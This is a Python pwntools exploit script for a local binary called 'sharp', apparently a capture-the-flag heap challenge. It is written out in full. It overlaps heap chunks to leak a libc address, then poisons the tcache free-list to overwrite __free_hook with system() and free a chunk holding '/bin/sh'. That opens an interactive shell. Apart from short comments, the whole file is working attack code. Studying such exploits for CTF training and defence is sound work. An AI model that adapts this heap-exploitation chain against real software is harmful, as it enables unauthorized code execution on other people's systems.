from pwn import *

r = process("./sharp")
#gdb.attach(r)
r.recvuntil(b'>')

def add(username):
	r.sendline(b'1')
	r.recvuntil(b'Enter username:')
	r.sendline(username)
	r.recvuntil(b'>')

def remove(index):
	r.sendline(b'2')
	r.recvuntil(b'to remove:')
	r.sendline(str(index))
	r.recvuntil(b'>')

def edit(index, newname):
	r.sendline(b'3')
	r.recvuntil(b'to edit:')
	r.sendline(index)
	r.recvuntil(b'Enter new username:')
	r.sendline(newname)
	r.recvuntil(b'>')

def swap(i1, i2):
	r.sendline(b'4')
	r.recvuntil(b'to swap:')
	r.sendline(i1)
	r.recvuntil(b'to swap with:')
	r.sendline(i2)
	r.recvuntil(b'>')

def list():
	r.sendline(b'5')
	result = r.recvuntil(b'>')
	return result
 

add(b"00000000")  # 0
add(b'1'*0x510)  # 1
add(b'22222222')  # 2
add(b'33333333')  # 3
add(b'4'*0x510)  # 4
add(b'55555555')  # 5
### *heap0: 0 - 1 - 2 - 3 - 4 -5


# remove chunk1
remove(1)
### *heap0: 0 - 2 - 3 - 4 - 5

# big2 - big1 = 0x8c0
payload = b'a'*0x70 + p64(0) + p64(0x8c0)
edit("0", payload)

# big2 size = 0x791, unset used bit
payload = b'a'*0x70 + p64(0x8c0) + p64(0x790)
# edit chunk3
edit("2", payload)

# remove chunk4
remove(3)
### *heap0: 0 - 2 - 3 - 5
# now chunk2 and chunk3 is in a FREE biiig chunk, but still IN USED :xD 

# add a big chunk (chunk6)
add(b'2'*0x510)  # 6
### *heap0: 0 - 2 - 3 - 5 - 6

# now fd and bk of chunk2 auto save address of 
stuff = list().split(b'\nEntry: 2')[0][-6:]

# leak lib_base address via chunk2
main_arena96 = int.from_bytes(stuff, "little")
malloc_hook_off = 0x0000000001ebb70
libc_base = main_arena96 - (malloc_hook_off + 0x10 + 96)
print(hex(libc_base))
free_hook_off = 0x00000000001eeb28
free_hook_address = libc_base + free_hook_off
system_off = 0x0000000000055410
system_addr = libc_base + system_off

## now make use after free vulnerability ##

# create 3 chunk same size (size < 0x400)
add(b'/bin/sh\x00')  # 7
add(b'123')          # 8
add(b'123')          # 9
### *heap0: 0 - 2 - 3 - 5 - 6 - 7 - 8 - 9

# free chunk9 - chunk8
remove(7)
remove(6)
### *heap0: 0 - 2 - 3 - 5 - 6 - 7 

# edit chunk6 to overwrite size of chunk7
payload = b'b'*(0x790 - 0x10) + p64(0) + p64(0x88)
edit("4", payload) 

# now size of chunk7 become 0x98 (origin size is 0x80)
# edit chunk7 to overwrite chunk8.fd to __free_hook address
payload = b"/bin/sh\x00"
payload += b'a'*(0x70 - len(payload)) + p64(0) + p64(0x81) + p64(free_hook_address)
edit("5", payload)

# let make a malloc
add(b'123')  # 10
# this next malloc will return in __free_hook address 
# and we will overwrite it with system :vv
add(p64(system_addr))  # 11
### *heap0: 0 - 2 - 3 - 5 - 6 - 7 - 10 - 11

# our chunk7 have "/bin/sh" let's free it
# remove(5)
r.sendline(b'2')
r.recvuntil(b'to remove:')
r.sendline(str(5))


r.interactive()
